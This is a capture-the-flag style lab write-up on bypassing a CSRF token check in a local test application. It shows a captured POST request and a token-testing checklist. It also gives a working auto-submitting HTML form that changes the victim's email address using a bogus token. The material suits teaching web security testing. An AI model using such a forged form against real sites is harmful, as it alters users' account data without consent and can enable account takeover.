
# 🛡️ Cross-Site Request Forgery (CSRF) Token Bypass

## Lab: CSRF 0x02

### 🔑 **Initial Setup**

In this lab, similar to CSRF 0x01, we log in with credentials ("jeremy", "jeremy") and are presented with a form to update our email address, initially setting it to `jeremy@jeremy.com`.

### 🕵️ **Investigation via Burp Suite**

Upon submitting the new email, we capture the POST request with Burp Suite:

```
POST /labs/csrf0x02.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: <http://localhost>
Connection: close
Referer: <http://localhost/labs/csrf0x02.php>
Cookie: csrf0x01=jeremy; csrf0x02=jeremy
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

email=jeremy&csrf=6Npl8FSbSXl4ze
```

### 🤔 **Exploring CSRF Token**

- We notice a CSRF token in the request and a corresponding hidden input in the HTML response:

```html
<input type="text" name="csrf" id="csrf" value="uiFzSQMNBOsxnd" hidden>
```

### 📚 **CSRF Token Validation Checklist**

We proceed to a detailed checklist to evaluate the effectiveness of CSRF protection:

- **Token Presence**: Verify every form includes a CSRF token.
- **Token in GET vs. POST**: Check if CSRF protection relies on POST exclusively or if GET requests bypass CSRF requirements.
- **Token Testing**: Assess the application's response to various manipulations of the token value and presence.
    - Using a random token
    - Reusing an old token
    - Using a token from another session
    - Testing predictability and static values
- **Additional Security Checks**:
    - Cross-check if tokens are tied to non-session cookies, vulnerable to XSS attacks, or validated through referer headers.
    - Examine if `SameSite` cookie attributes are set correctly to prevent CSRF.
    - Attempt to override HTTP methods to bypass CSRF protections.

### 🛠️ **Modifying the Attack Vector**

We modify our previous CSRF attack by changing the token value in our HTML file (`csrf2.html`):

```html
<html>
<body>
<form action="<http://localhost/labs/csrf0x02.php>" method="post">
    <input type="text" name="email" value="csrf@csrf.com">
    <input type="text" name="csrf" id="csrf" value="johnwashere" hidden>
    <button type="submit">Submit</button>
</form>

<script>
    window.onload = function(){
        document.forms[0].submit();
    }
</script>
</body>
</html>
```

### 🌍 **Execution and Results**

- **Accessing URL**: By opening `file:///home/kali/Documents/csrf2.html` in a browser, the page automatically submits the modified form.
- **Outcome**:
    - "Update contact email address"
    - "Current user: jeremy"
    - "Email address: [csrf@csrf.com](mailto:csrf@csrf.com)"

### ✅ **Conclusion**

This experiment successfully demonstrates the CSRF token bypass, indicating vulnerabilities in the token validation process or session management, thereby confirming the effectiveness of our crafted attack in altering user data without proper authorization.
